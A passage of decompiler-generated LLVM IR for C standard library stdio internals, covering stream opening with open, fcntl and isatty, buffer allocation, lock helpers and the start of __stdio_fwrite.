  store i32 %v0_80643be, i32* %eax.global-to-local, align 4
  %v0_80643c5.pre.pre = load i32, i32* @edx, align 4
  br label %dec_label_pc_80643c3

dec_label_pc_80643c3:                             ; preds = %entry, %dec_label_pc_80643a6
  %v0_80643c5.pre = phi i32 [ %v4_806436b, %entry ], [ %v0_80643c5.pre.pre, %dec_label_pc_80643a6 ]
  store i32 0, i32* @esi, align 4
  br label %dec_label_pc_80643c5

dec_label_pc_80643c5:                             ; preds = %dec_label_pc_806438a, %dec_label_pc_8064381, %dec_label_pc_80643c3
  %v0_80643c9 = phi i32 [ %v4_806436b, %dec_label_pc_806438a ], [ %v4_806436b, %dec_label_pc_8064381 ], [ %v0_80643c5.pre, %dec_label_pc_80643c3 ]
  %v0_80643d5 = phi i32 [ 1089, %dec_label_pc_806438a ], [ 577, %dec_label_pc_8064381 ], [ 0, %dec_label_pc_80643c3 ]
  %v1_80643c5 = add i32 %v0_80643c9, 1
  %v2_80643c5 = inttoptr i32 %v1_80643c5 to i8*
  %v3_80643c5 = load i8, i8* %v2_80643c5, align 1
  %v12_80643c5 = icmp eq i8 %v3_80643c5, 98
  %v1_80643cc = icmp eq i1 %v12_80643c5, false
  %v4_80643cc = select i1 %v1_80643cc, i32 %v0_80643c9, i32 %v1_80643c5
  store i32 %v4_80643cc, i32* %eax.global-to-local, align 4
  %v1_80643cf = add i32 %v4_80643cc, 1
  %v2_80643cf = inttoptr i32 %v1_80643cf to i8*
  %v3_80643cf = load i8, i8* %v2_80643cf, align 1
  %v12_80643cf = icmp eq i8 %v3_80643cf, 43
  %v1_80643d3 = icmp eq i1 %v12_80643cf, false
  br i1 %v1_80643d3, label %dec_label_pc_80643dd, label %dec_label_pc_80643d5

dec_label_pc_80643d5:                             ; preds = %dec_label_pc_80643c5
  %v1_80643d7 = or i32 %v0_80643d5, 1
  store i32 %v1_80643d7, i32* %eax.global-to-local, align 4
  %v1_80643da = add nuw nsw i32 %v1_80643d7, 1
  store i32 %v1_80643da, i32* @esi, align 4
  br label %dec_label_pc_80643dd

dec_label_pc_80643dd:                             ; preds = %dec_label_pc_80643c5, %dec_label_pc_80643d5
  %v0_80644666 = phi i32 [ %v0_80643d5, %dec_label_pc_80643c5 ], [ %v1_80643da, %dec_label_pc_80643d5 ]
  %v0_80643dd = load i32, i32* @ebx, align 4
  %v1_80643dd = icmp eq i32 %v0_80643dd, 0
  %v1_80643df = icmp eq i1 %v1_80643dd, false
  br i1 %v1_80643df, label %dec_label_pc_8064419, label %dec_label_pc_80643e1

dec_label_pc_80643e1:                             ; preds = %dec_label_pc_80643dd
  %v1_80643e6 = call i32 @malloc(i32 68)
  %v2_80643e6 = inttoptr i32 %v1_80643e6 to i16*
  store i32 %v1_80643e6, i32* %eax.global-to-local, align 4
  %v2_80643ee = icmp eq i32 %v1_80643e6, 0
  store i32 %v1_80643e6, i32* @ebx, align 4
  call void @__pseudo_cond_branch(i1 %v2_80643ee, i32 134628885)
  store i16 8192, i16* %v2_80643e6, align 2
  %v2_80643fd = add i32 %v1_80643e6, 8
  %v3_80643fd = inttoptr i32 %v2_80643fd to i32*
  store i32 0, i32* %v3_80643fd, align 4
  %v2_8064404 = add i32 %v1_80643e6, 64
  %v3_8064404 = inttoptr i32 %v2_8064404 to i32*
  store i32 0, i32* %v3_8064404, align 4
  %v2_806440b = add i32 %v1_80643e6, 60
  %v3_806440b = inttoptr i32 %v2_806440b to i32*
  store i32 0, i32* %v3_806440b, align 4
  %v2_8064412 = add i32 %v1_80643e6, 56
  %v3_8064412 = inttoptr i32 %v2_8064412 to i32*
  store i32 0, i32* %v3_8064412, align 4
  %v0_8064466.pre = load i32, i32* @esi, align 4
  br label %dec_label_pc_8064419

dec_label_pc_8064419:                             ; preds = %dec_label_pc_80643dd, %dec_label_pc_80643e1
  %v2_806446c = phi i32 [ %v0_80644666, %dec_label_pc_80643dd ], [ %v0_8064466.pre, %dec_label_pc_80643e1 ]
  %v0_8064419 = load i32, i32* @ebp, align 4
  %v2_8064419 = icmp slt i32 %v0_8064419, 0
  br i1 %v2_8064419, label %dec_label_pc_8064466, label %dec_label_pc_806441d

dec_label_pc_806441d:                             ; preds = %dec_label_pc_8064419
  %v1_806441f = and i32 %v2_806446c, 32771
  %v1_8064425 = add nuw nsw i32 %v1_806441f, 1
  store i32 %v1_8064425, i32* @edx, align 4
  %v0_8064426 = load i32, i32* @edi, align 4
  %v1_8064426 = add i32 %v0_8064426, 1
  %v2_8064429 = and i32 %v1_8064426, %v1_8064425
  store i32 %v2_8064429, i32* %eax.global-to-local, align 4
  %v12_806442b = icmp eq i32 %v2_8064429, %v1_8064425
  %v1_806442d = load i32, i32* @ebx, align 4
  %v2_806442d = add i32 %v1_806442d, 4
  %v3_806442d = inttoptr i32 %v2_806442d to i32*
  store i32 %v0_8064419, i32* %v3_806442d, align 4
  %v1_8064430 = icmp eq i1 %v12_806442b, false
  br i1 %v1_8064430, label %dec_label_pc_8064392, label %dec_label_pc_8064436

dec_label_pc_8064436:                             ; preds = %dec_label_pc_806441d
  %v0_8064436 = load i32, i32* @edi, align 4
  %v1_8064438 = and i32 %v0_8064436, 1024
  %v1_806443a = xor i32 %v1_8064438, 1024
  store i32 %v1_806443a, i32* %eax.global-to-local, align 4
  %v1_806443f = load i32, i32* @esi, align 4
  %v2_806443f = and i32 %v1_806443f, %v1_806443a
  %v3_806443f = icmp eq i32 %v2_806443f, 0
  br i1 %v3_806443f, label %dec_label_pc_806445c, label %dec_label_pc_8064443

dec_label_pc_8064443:                             ; preds = %dec_label_pc_8064436
  %v0_8064443 = load i32, i32* @edx, align 4
  %v3_806444c = call i32 @__libc_fcntl(i32 4, i32 1024, i32 %v0_8064443)
  store i32 %v3_806444c, i32* %eax.global-to-local, align 4
  %v1_8064454 = icmp eq i32 %v3_806444c, 0
  %v1_8064456 = icmp eq i1 %v1_8064454, false
  br i1 %v1_8064456, label %dec_label_pc_8064392, label %dec_label_pc_8064443.dec_label_pc_806445c_crit_edge

dec_label_pc_8064443.dec_label_pc_806445c_crit_edge: ; preds = %dec_label_pc_8064443
  %v0_806445c.pre = load i32, i32* @edi, align 4
  %v0_8064462.pre = load i32, i32* @esi, align 4
  br label %dec_label_pc_806445c

dec_label_pc_806445c:                             ; preds = %dec_label_pc_8064443.dec_label_pc_806445c_crit_edge, %dec_label_pc_8064436
  %v0_8064462 = phi i32 [ %v0_8064462.pre, %dec_label_pc_8064443.dec_label_pc_806445c_crit_edge ], [ %v1_806443f, %dec_label_pc_8064436 ]
  %v0_806445c = phi i32 [ %v0_806445c.pre, %dec_label_pc_8064443.dec_label_pc_806445c_crit_edge ], [ %v0_8064436, %dec_label_pc_8064436 ]
  %v1_806445c = and i32 %v0_806445c, 32768
  store i32 %v1_806445c, i32* @edi, align 4
  %v2_8064462 = or i32 %v1_806445c, %v0_8064462
  br label %dec_label_pc_806448a

dec_label_pc_8064466:                             ; preds = %dec_label_pc_8064419
  %v11_8064468 = or i32 %v2_806446c, 32768
  store i32 %v11_8064468, i32* @eax, align 4
  %v1_806446b = add i32 %v0_8064419, 1
  %v8_806446b = icmp eq i32 %v1_806446b, 0
  store i32 %v1_806446b, i32* @ebp, align 4
  %v1_806446c = icmp eq i1 %v8_806446b, false
  %v4_806446c = select i1 %v1_806446c, i32 %v11_8064468, i32 %v2_806446c
  store i32 %v4_806446c, i32* @esi, align 4
  %v0_8064476 = load i32, i32* @edi, align 4
  %v2_8064477 = call i32 @__libc_open(i32 %v0_8064476, i32 %v4_806446c)
  store i32 %v2_8064477, i32* %eax.global-to-local, align 4
  %v2_806447f = icmp slt i32 %v2_8064477, 0
  %v1_8064481 = load i32, i32* @ebx, align 4
  %v2_8064481 = add i32 %v1_8064481, 4
  %v3_8064481 = inttoptr i32 %v2_8064481 to i32*
  store i32 %v2_8064477, i32* %v3_8064481, align 4
  br i1 %v2_806447f, label %dec_label_pc_80643a6, label %dec_label_pc_8064466.dec_label_pc_806448a_crit_edge

dec_label_pc_8064466.dec_label_pc_806448a_crit_edge: ; preds = %dec_label_pc_8064466
  %v0_806448c.pre = load i32, i32* @esi, align 4
  br label %dec_label_pc_806448a

dec_label_pc_806448a:                             ; preds = %dec_label_pc_8064466.dec_label_pc_806448a_crit_edge, %dec_label_pc_806445c
  %v0_806448c = phi i32 [ %v0_806448c.pre, %dec_label_pc_8064466.dec_label_pc_806448a_crit_edge ], [ %v2_8064462, %dec_label_pc_806445c ]
  %v0_806448a = load i32, i32* @ebx, align 4
  %v1_806448a = inttoptr i32 %v0_806448a to i32*
  %v2_806448a = load i32, i32* %v1_806448a, align 4
  %v1_806448e = urem i32 %v0_806448c, 4
  store i32 %v1_806448e, i32* @esi, align 4
  %v1_8064491 = and i32 %v0_806448c, -31744
  %v1_8064496 = and i32 %v2_806448a, 8192
  %tmp = or i32 %v1_8064496, %v1_8064491
  %v1_806449e = mul nuw nsw i32 %v1_806448e, 16
  %v1_80644a1 = add nuw nsw i32 %v1_806449e, 16
  %v2_806449c = or i32 %v1_80644a1, %tmp
  %v2_80644a7 = xor i32 %v2_806449c, 48
  store i32 %v2_80644a7, i32* %eax.global-to-local, align 4
  %v1_80644a9 = trunc i32 %v2_80644a7 to i16
  %v3_80644a9 = inttoptr i32 %v0_806448a to i16*
  store i16 %v1_80644a9, i16* %v3_80644a9, align 2
  %v0_80644ac = load i32, i32* @ebx, align 4
  %v1_80644ac = add i32 %v0_80644ac, 4
  %v2_80644ac = inttoptr i32 %v1_80644ac to i32*
  %v3_80644ac = load i32, i32* %v2_80644ac, align 4
  store i32 %v3_80644ac, i32* %eax.global-to-local, align 4
  %v9_80644af = icmp eq i32 %v3_80644ac, 2147483647
  br i1 %v9_80644af, label %dec_label_pc_80644da, label %dec_label_pc_80644b6

dec_label_pc_80644b6:                             ; preds = %dec_label_pc_806448a
  store i32 -8, i32* @edi, align 4
  %v2_80644bf = load i32, i32* inttoptr (i32 -8 to i32*), align 8
  store i32 %v2_80644bf, i32* @esi, align 4
  %v1_80644c3 = call i32 @isatty(i32 %v3_80644ac)
  store i32 %v1_80644c3, i32* %eax.global-to-local, align 4
  %v1_80644cb = icmp eq i32 %v1_80644c3, 0
  br i1 %v1_80644cb, label %dec_label_pc_80644d7, label %dec_label_pc_80644cf

dec_label_pc_80644cf:                             ; preds = %dec_label_pc_80644b6
  %v0_80644cf = load i32, i32* @ebx, align 4
  %v1_80644cf = inttoptr i32 %v0_80644cf to i32*
  %v2_80644cf = load i32, i32* %v1_80644cf, align 4
  %v1_80644d1 = udiv i32 %v2_80644cf, 256
  %v3_80644d1 = and i32 %v1_80644d1, 254
  %v8_80644d1 = or i32 %v3_80644d1, 1
  %v10_80644d1 = mul nuw nsw i32 %v8_80644d1, 256
  %v11_80644d1 = and i32 %v2_80644cf, -65281
  %v12_80644d1 = or i32 %v10_80644d1, %v11_80644d1
  store i32 %v12_80644d1, i32* %eax.global-to-local, align 4
  %v1_80644d4 = trunc i32 %v12_80644d1 to i16
  %v3_80644d4 = inttoptr i32 %v0_80644cf to i16*
  store i16 %v1_80644d4, i16* %v3_80644d4, align 2
  br label %dec_label_pc_80644d7

dec_label_pc_80644d7:                             ; preds = %dec_label_pc_80644b6, %dec_label_pc_80644cf
  %v0_80644d7 = load i32, i32* @esi, align 4
  %v1_80644d7 = load i32, i32* @edi, align 4
  %v2_80644d7 = inttoptr i32 %v1_80644d7 to i32*
  store i32 %v0_80644d7, i32* %v2_80644d7, align 4
  %v0_80644da.pre = load i32, i32* @ebx, align 4
  br label %dec_label_pc_80644da

dec_label_pc_80644da:                             ; preds = %dec_label_pc_806448a, %dec_label_pc_80644d7
  %v0_80644da = phi i32 [ %v0_80644ac, %dec_label_pc_806448a ], [ %v0_80644da.pre, %dec_label_pc_80644d7 ]
  %v1_80644da = add i32 %v0_80644da, 8
  %v2_80644da = inttoptr i32 %v1_80644da to i32*
  %v3_80644da = load i32, i32* %v2_80644da, align 4
  %v4_80644da = icmp eq i32 %v3_80644da, 0
  %v1_80644de = icmp eq i1 %v4_80644da, false
  br i1 %v1_80644de, label %dec_label_pc_8064510, label %dec_label_pc_80644e0

dec_label_pc_80644e0:                             ; preds = %dec_label_pc_80644da
  %v1_80644e8 = call i32 @malloc(i32 4096)
  store i32 %v1_80644e8, i32* %eax.global-to-local, align 4
  %v1_80644f0 = icmp eq i32 %v1_80644e8, 0
  %v1_80644f2 = load i32, i32* @ebx, align 4
  %v2_80644f2 = add i32 %v1_80644f2, 8
  %v3_80644f2 = inttoptr i32 %v2_80644f2 to i32*
  store i32 %v1_80644e8, i32* %v3_80644f2, align 4
  br i1 %v1_80644f0, label %dec_label_pc_8064509, label %dec_label_pc_80644f7

dec_label_pc_80644f7:                             ; preds = %dec_label_pc_80644e0
  %v1_80644f7 = add i32 %v1_80644e8, 4096
  store i32 %v1_80644f7, i32* %eax.global-to-local, align 4
  %v1_80644fc = load i32, i32* @ebx, align 4
  %v2_80644fc = add i32 %v1_80644fc, 12
  %v3_80644fc = inttoptr i32 %v2_80644fc to i32*
  store i32 %v1_80644f7, i32* %v3_80644fc, align 4
  %v0_80644ff = load i32, i32* @ebx, align 4
  %v1_80644ff = inttoptr i32 %v0_80644ff to i32*
  %v2_80644ff = load i32, i32* %v1_80644ff, align 4
  %v1_8064501 = udiv i32 %v2_80644ff, 256
  %v3_8064501 = and i32 %v1_8064501, 191
  %v8_8064501 = or i32 %v3_8064501, 64
  %v10_8064501 = mul nuw nsw i32 %v8_8064501, 256
  %v11_8064501 = and i32 %v2_80644ff, -65281
  %v12_8064501 = or i32 %v10_8064501, %v11_8064501
  store i32 %v12_8064501, i32* %eax.global-to-local, align 4
  %v1_8064504 = trunc i32 %v12_8064501 to i16
  %v3_8064504 = inttoptr i32 %v0_80644ff to i16*
  store i16 %v1_8064504, i16* %v3_8064504, align 2
  br label %dec_label_pc_8064510

dec_label_pc_8064509:                             ; preds = %dec_label_pc_80644e0
  %v0_8064509 = load i32, i32* @ebx, align 4
  %v1_8064509 = add i32 %v0_8064509, 12
  %v2_8064509 = inttoptr i32 %v1_8064509 to i32*
  store i32 0, i32* %v2_8064509, align 4
  br label %dec_label_pc_8064510

dec_label_pc_8064510:                             ; preds = %dec_label_pc_80644da, %dec_label_pc_80644f7, %dec_label_pc_8064509
  %v0_8064510 = load i32, i32* @ebx, align 4
  %v1_8064510 = add i32 %v0_8064510, 8
  %v2_8064510 = inttoptr i32 %v1_8064510 to i32*
  %v3_8064510 = load i32, i32* %v2_8064510, align 4
  store i32 %v3_8064510, i32* %eax.global-to-local, align 4
  %v1_8064513 = add i32 %v0_8064510, 2
  %v2_8064513 = inttoptr i32 %v1_8064513 to i8*
  store i8 0, i8* %v2_8064513, align 1
  %v0_8064517 = load i32, i32* @ebx, align 4
  %v1_8064517 = add i32 %v0_8064517, 1
  %v2_8064517 = inttoptr i32 %v1_8064517 to i8*
  %v3_8064517 = load i8, i8* %v2_8064517, align 1
  %v4_8064517 = and i8 %v3_8064517, 32
  %v5_8064517 = icmp eq i8 %v4_8064517, 0
  %v1_806451b = add i32 %v0_8064517, 44
  %v2_806451b = inttoptr i32 %v1_806451b to i32*
  store i32 0, i32* %v2_806451b, align 4
  %v0_8064522 = load i32, i32* %eax.global-to-local, align 4
  %v1_8064522 = load i32, i32* @ebx, align 4
  %v2_8064522 = add i32 %v1_8064522, 24
  %v3_8064522 = inttoptr i32 %v2_8064522 to i32*
  store i32 %v0_8064522, i32* %v3_8064522, align 4
  %v0_8064525 = load i32, i32* %eax.global-to-local, align 4
  %v1_8064525 = load i32, i32* @ebx, align 4
  %v2_8064525 = add i32 %v1_8064525, 28
  %v3_8064525 = inttoptr i32 %v2_8064525 to i32*
  store i32 %v0_8064525, i32* %v3_8064525, align 4
  %v0_8064528 = load i32, i32* %eax.global-to-local, align 4
  %v1_8064528 = load i32, i32* @ebx, align 4
  %v2_8064528 = add i32 %v1_8064528, 16
  %v3_8064528 = inttoptr i32 %v2_8064528 to i32*
  store i32 %v0_8064528, i32* %v3_8064528, align 4
  %v0_806452b = load i32, i32* %eax.global-to-local, align 4
  %v1_806452b = load i32, i32* @ebx, align 4
  %v2_806452b = add i32 %v1_806452b, 20
  %v3_806452b = inttoptr i32 %v2_806452b to i32*
  store i32 %v0_806452b, i32* %v3_806452b, align 4
  %v0_806452e = load i32, i32* @global_var_8071924.1676, align 4
  store i32 %v0_806452e, i32* %eax.global-to-local, align 4
  %v1_8064533 = load i32, i32* @ebx, align 4
  %v2_8064533 = add i32 %v1_8064533, 52
  %v3_8064533 = inttoptr i32 %v2_8064533 to i32*
  store i32 %v0_806452e, i32* %v3_8064533, align 4
  call void @__pseudo_cond_branch(i1 %v5_8064517, i32 134628885)
  %v0_806453c = load i32, i32* inttoptr (i32 8 to i32*), align 8
  store i32 %v0_806453c, i32* @edx, align 4
  %v0_8064543 = load i32, i32* @global_var_8075b78.1567, align 8
  %v12_8064543 = icmp eq i32 %v0_8064543, %v0_806453c
  call void @__pseudo_cond_branch(i1 %v12_8064543, i32 ptrtoint (i32* @global_var_8064570.1677 to i32))
  store i32 0, i32* %eax.global-to-local, align 4
  store i32 1, i32* @ecx, align 4
  %v0_8064552 = load i32, i32* inttoptr (i32 12 to i32*), align 4
  %v1_8064552 = icmp eq i32 %v0_8064552, 0
  call void @__pseudo_cond_branch(i1 %v1_8064552, i32 134628701)
  %v0_806455c = load i32, i32* @global_var_8075b70.1569, align 16
  %v1_806455c = load i32, i32* @ecx, align 4
  %v2_806455c = load i32, i32* %eax.global-to-local, align 4
  %v13_806455c = icmp eq i32 %v2_806455c, %v0_806455c
  %v20_806455c = select i1 %v13_806455c, i32 %v1_806455c, i32 %v0_806455c
  store i32 %v20_806455c, i32* @global_var_8075b70.1569, align 16
  store i32 %v0_806455c, i32* %eax.global-to-local, align 4
  %v1_8064564 = icmp eq i1 %v13_806455c, false
  call void @__pseudo_cond_branch(i1 %v1_8064564, i32 134628895)
  ret i32 %v0_806455c

; uselistorder directives
  uselistorder i32 %v0_806455c, { 1, 0, 3, 2 }
  uselistorder i32 %v2_80644ff, { 1, 0 }
  uselistorder i32 %v1_80644e8, { 0, 2, 1, 3 }
  uselistorder i32 %v2_80644cf, { 1, 0 }
  uselistorder i32 %v3_80644ac, { 1, 0, 2 }
  uselistorder i32 %v2_80644a7, { 1, 0 }
  uselistorder i32 %v1_806448e, { 1, 0 }
  uselistorder i32 %v0_806448c, { 1, 0 }
  uselistorder i32 %v11_8064468, { 1, 0 }
  uselistorder i32 %v1_806443a, { 1, 0 }
  uselistorder i32 %v0_8064436, { 1, 0 }
  uselistorder i32 %v2_806446c, { 1, 0, 2 }
  uselistorder i32 %v1_80643e6, { 0, 1, 2, 3, 4, 5, 7, 6 }
  uselistorder i32 %v4_806436b, { 1, 2, 0, 3 }
  uselistorder i32* %eax.global-to-local, { 0, 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 26, 23, 24, 25 }
  uselistorder i32 4096, { 19, 8, 18, 4, 5, 20, 21, 6, 17, 9, 11, 10, 1, 12, 14, 13, 2, 16, 15, 3, 0, 7 }
  uselistorder i32 (i32)* @isatty, { 2, 1, 0 }
  uselistorder i32 (i32, i32)* @__libc_open, { 3, 0, 4, 2, 1 }
  uselistorder i32 32768, { 0, 2, 1 }
  uselistorder i32 (i32, i32, i32)* @__libc_fcntl, { 1, 6, 0, 10, 9, 8, 7, 5, 4, 3, 2 }
  uselistorder i8 114, { 0, 2, 1, 3 }
  uselistorder label %dec_label_pc_8064510, { 2, 1, 0 }
  uselistorder label %dec_label_pc_80644da, { 1, 0 }
  uselistorder label %dec_label_pc_80644d7, { 1, 0 }
  uselistorder label %dec_label_pc_8064419, { 1, 0 }
  uselistorder label %dec_label_pc_80643dd, { 1, 0 }
  uselistorder label %dec_label_pc_80643c5, { 2, 0, 1 }
  uselistorder label %dec_label_pc_80643c3, { 1, 0 }
}

define i32 @function_806456a() local_unnamed_addr {
dec_label_pc_806456a:
  %v0_806456a = load i32, i32* @edx, align 4
  store i32 %v0_806456a, i32* @global_var_8075b78.1567, align 8
  %v0_8064570 = load i32, i32* @global_var_8075b74.1568, align 4
  %v1_8064570 = add i32 %v0_8064570, 1
  store i32 %v1_8064570, i32* @global_var_8075b74.1568, align 4
  %v0_8064576 = load i32, i32* @global_var_8075b6c.1564, align 4
  %v12_8064576 = icmp eq i32 %v0_8064576, %v0_806456a
  call void @__pseudo_cond_branch(i1 %v12_8064576, i32 ptrtoint (i32* @global_var_80645a3.1678 to i32))
  %v0_8064585 = load i32, i32* inttoptr (i32 12 to i32*), align 4
  %v1_8064585 = icmp eq i32 %v0_8064585, 0
  call void @__pseudo_cond_branch(i1 %v1_8064585, i32 134628752)
  %v0_806458f = load i32, i32* @global_var_8075b64.1566, align 4
  %v13_806458f = icmp eq i32 %v0_806458f, 0
  %v20_806458f = select i1 %v13_806458f, i32 1, i32 %v0_806458f
  store i32 %v20_806458f, i32* @global_var_8075b64.1566, align 4
  %v1_8064597 = icmp eq i1 %v13_806458f, false
  call void @__pseudo_cond_branch(i1 %v1_8064597, i32 134628911)
  ret i32 %v0_806458f

; uselistorder directives
  uselistorder i32 %v0_806458f, { 0, 2, 1 }
}

define i32 @function_806459d() local_unnamed_addr {
dec_label_pc_806459d:
  %v0_806459d = load i32, i32* @edx, align 4
  store i32 %v0_806459d, i32* @global_var_8075b6c.1564, align 4
  %v0_80645a3 = load i32, i32* bitcast (i32** @global_var_8071920.1563 to i32*), align 32
  %v0_80645a8 = load i32, i32* @global_var_8075b68.1565, align 8
  %v1_80645a8 = add i32 %v0_80645a8, 1
  store i32 %v1_80645a8, i32* @global_var_8075b68.1565, align 8
  %v1_80645ae = load i32, i32* @ebx, align 4
  %v2_80645ae = add i32 %v1_80645ae, 32
  %v3_80645ae = inttoptr i32 %v2_80645ae to i32*
  store i32 %v0_80645a3, i32* %v3_80645ae, align 4
  %v0_80645b1 = load i32, i32* @global_var_8075b68.1565, align 8
  %v0_80645b6 = load i32, i32* @ebx, align 4
  store i32 %v0_80645b6, i32* bitcast (i32** @global_var_8071920.1563 to i32*), align 32
  %v1_80645bc = add i32 %v0_80645b1, -1
  %v8_80645bc = icmp eq i32 %v1_80645bc, 0
  store i32 %v1_80645bc, i32* @global_var_8075b68.1565, align 8
  %v1_80645c4 = icmp eq i1 %v8_80645bc, false
  call void @__pseudo_cond_branch(i1 %v1_80645c4, i32 134628836)
  store i32 0, i32* @global_var_8075b6c.1564, align 4
  %v0_80645d0 = load i32, i32* inttoptr (i32 12 to i32*), align 4
  %v1_80645d0 = icmp eq i32 %v0_80645d0, 0
  call void @__pseudo_cond_branch(i1 %v1_80645d0, i32 134628827)
  %v0_80645da = load i32, i32* @global_var_8075b64.1566, align 4
  %v1_80645da = add i32 %v0_80645da, -1
  %v9_80645da = icmp eq i32 %v1_80645da, 0
  store i32 %v1_80645da, i32* @global_var_8075b64.1566, align 4
  %v1_80645e2 = icmp eq i1 %v9_80645da, false
  call void @__pseudo_cond_branch(i1 %v1_80645e2, i32 134628927)
  ret i32 %v1_80645bc

; uselistorder directives
  uselistorder i32 %v1_80645da, { 1, 0 }
}

define i32 @function_80645e4() local_unnamed_addr {
dec_label_pc_80645e4:
  %v0_80645e4 = load i32, i32* @global_var_8075b74.1568, align 4
  %v1_80645e9 = add i32 %v0_80645e4, -1
  %v8_80645e9 = icmp eq i32 %v1_80645e9, 0
  store i32 %v1_80645e9, i32* @global_var_8075b74.1568, align 4
  %v1_80645f1 = icmp eq i1 %v8_80645e9, false
  call void @__pseudo_cond_branch(i1 %v1_80645f1, i32 134628885)
  store i32 0, i32* @global_var_8075b78.1567, align 8
  %v0_80645fd = load i32, i32* inttoptr (i32 12 to i32*), align 4
  %v1_80645fd = icmp eq i32 %v0_80645fd, 0
  call void @__pseudo_cond_branch(i1 %v1_80645fd, i32 134628872)
  %v0_8064607 = load i32, i32* @global_var_8075b70.1569, align 16
  %v1_8064607 = add i32 %v0_8064607, -1
  %v9_8064607 = icmp eq i32 %v1_8064607, 0
  store i32 %v1_8064607, i32* @global_var_8075b70.1569, align 16
  %v1_806460f = icmp eq i1 %v9_8064607, false
  call void @__pseudo_cond_branch(i1 %v1_806460f, i32 134628940)
  ret i32 %v1_80645e9

; uselistorder directives
  uselistorder i32 %v1_8064607, { 1, 0 }
}

define i32 @function_8064611() local_unnamed_addr {
dec_label_pc_8064611:
  %v0_8064611 = call i32 @function_8064615()
  ret i32 %v0_8064611

; uselistorder directives
  uselistorder i32 ()* @function_8064615, { 1, 0 }
}

define i32 @function_8064615() local_unnamed_addr {
dec_label_pc_8064615:
  %v0_8064618 = load i32, i32* @ebx, align 4
  ret i32 %v0_8064618
}

define i32 @_L_lock_205() local_unnamed_addr {
entry:
  store i32 ptrtoint (i32* @global_var_8075b70.1569 to i32), i32* @ecx, align 4
  %v0_8064625 = call i32 @__lll_lock_wait_private()
  %v0_806462a = call i32 @function_806456a()
  ret i32 %v0_806462a
}

define i32 @_L_lock_216() local_unnamed_addr {
entry:
  store i32 ptrtoint (i32* @global_var_8075b64.1566 to i32), i32* @ecx, align 4
  %v0_8064635 = call i32 @__lll_lock_wait_private()
  %v0_806463a = call i32 @function_806459d()
  ret i32 %v0_806463a
}

define i32 @_L_unlock_232() local_unnamed_addr {
entry:
  store i32 ptrtoint (i32* @global_var_8075b64.1566 to i32), i32* @eax, align 4
  %v0_8064645 = call i32 @__lll_unlock_wake_private()
  %v0_806464a = call i32 @function_80645e4()
  ret i32 %v0_806464a
}

define i32 @_L_unlock_242() local_unnamed_addr {
entry:
  store i32 ptrtoint (i32* @global_var_8075b70.1569 to i32), i32* @eax, align 4
  %v0_8064652 = call i32 @__lll_unlock_wake_private()
  %v0_8064657 = call i32 @function_8064611()
  ret i32 %v0_8064657
}

define i32 @__stdio_fwrite(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %eax.global-to-local = alloca i32, align 4
  %ebx.global-to-local = alloca i32, align 4
  %edi.global-to-local = alloca i32, align 4
  %zf.global-to-local = alloca i1, align 1
  %stack_var_-28 = alloca i32, align 4
  %stack_var_-16 = alloca i32, align 4
  %v0_806465c = load i32, i32* @ebp, align 4
  %v0_806465d = load i32, i32* @edi, align 4
  %v0_806465e = load i32, i32* @esi, align 4
  %v0_806465f = load i32, i32* @ebx, align 4
  store i32 %v0_806465f, i32* %stack_var_-16, align 4
  store i1 false, i1* %zf.global-to-local, align 1
  store i32 %arg3, i32* @esi, align 4
  store i32 %arg1, i32* @edi, align 4
  store i32 %arg2, i32* @ebp, align 4
  %v1_806466f = add i32 %arg3, 1
  %v2_806466f = inttoptr i32 %v1_806466f to i8*
  %v3_806466f = load i8, i8* %v2_806466f, align 1
  %v4_806466f = and i8 %v3_806466f, 2
  %v5_806466f = icmp eq i8 %v4_806466f, 0
  store i1 %v5_806466f, i1* %zf.global-to-local, align 1
  %v1_8064673 = icmp eq i1 %v5_806466f, false
  br i1 %v1_8064673, label %dec_label_pc_8064734, label %dec_label_pc_8064679

dec_label_pc_8064679:                             ; preds = %entry
  %v1_8064679 = add i32 %arg3, 4
  %v2_8064679 = inttoptr i32 %v1_8064679 to i32*
  %v3_8064679 = load i32, i32* %v2_8064679, align 4
  %v13_8064679 = icmp eq i32 %v3_8064679, -2
  store i1 %v13_8064679, i1* %zf.global-to-local, align 1
  %v1_806467d = add i32 %arg3, 16
  %v2_806467d = inttoptr i32 %v1_806467d to i32*
  %v3_806467d = load i32, i32* %v2_806467d, align 4
  store i32 %v3_806467d, i32* @edx, align 4
  %v1_8064680 = add i32 %arg3, 12
  %v2_8064680 = inttoptr i32 %v1_8064680 to i32*
  %v3_8064680 = load i32, i32* %v2_8064680, align 4
  store i32 %v3_8064680, i32* %eax.global-to-local, align 4
  %v1_8064683 = icmp eq i1 %v13_8064679, false
  %v2_80646a2 = sub i32 %v3_8064680, %v3_806467d
  br i1 %v1_8064683, label %dec_label_pc_80646a2, label %dec_label_pc_8064685

dec_label_pc_8064685:                             ; preds = %dec_label_pc_8064679
  %v12_8064689 = icmp eq i32 %v2_80646a2, %arg2
  store i1 %v12_8064689, i1* %zf.global-to-local, align 1
  %tmp = icmp uge i32 %v2_80646a2, %arg2
  %v5_806468c = select i1 %tmp, i32 %arg2, i32 %v2_80646a2
  store i32 %v5_806468c, i32* %ebx.global-to-local, align 4
  %v3_8064692 = inttoptr i32 %v3_806467d to i8*
  %v4_8064692 = call i32 @memcpy(i8* %v3_8064692, i32 %arg1, i32 %v5_806468c)
  store i32 %v4_8064692, i32* %eax.global-to-local, align 4
  %v0_806469a = load i32, i32* @esi, align 4
  %v1_806469a = add i32 %v0_806469a, 16
  %v2_806469a = inttoptr i32 %v1_806469a to i32*
  %v3_806469a = load i32, i32* %v2_806469a, align 4
  %v4_806469a = load i32, i32* %ebx.global-to-local, align 4
  %v5_806469a = add i32 %v4_806469a, %v3_806469a
  %v15_806469a = icmp eq i32 %v5_806469a, 0
  store i1 %v15_806469a, i1* %zf.global-to-local, align 1
  store i32 %v5_806469a, i32* %v2_806469a, align 4
  br label %dec_label_pc_806474c

dec_label_pc_80646a2:                             ; preds = %dec_label_pc_8064679
  store i32 %v2_80646a2, i32* %eax.global-to-local, align 4
  %v12_80646a4 = icmp eq i32 %v2_80646a2, %arg2
  store i1 %v12_80646a4, i1* %zf.global-to-local, align 1
  %v6_80646a6 = icmp ult i32 %v2_80646a2, %arg2
  br i1 %v6_80646a6, label %dec_label_pc_806471b, label %dec_label_pc_80646a8

dec_label_pc_80646a8:                             ; preds = %dec_label_pc_80646a2
  %v0_80646a8 = load i32, i32* @ecx, align 4
